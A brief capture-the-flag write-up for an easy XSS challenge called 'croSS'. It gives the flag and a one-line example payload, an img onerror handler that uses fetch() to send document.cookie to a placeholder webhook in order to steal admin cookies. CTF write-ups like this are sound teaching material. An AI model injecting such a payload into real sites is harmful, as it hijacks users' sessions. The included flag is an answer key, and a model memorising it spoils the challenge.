# croSS

**Author** : legasi  
**Difficulty**: Easy  
**Description**: Search for Trouble

**Flag**: `SCC{cro55_5ite_5cripting}`

# Writeup

The goal of the challenge was to steal admin cookies with XSS.

Example payload:
```html
<img src=x onerror=fetch('WEBHOOK'+document.cookie)>
```

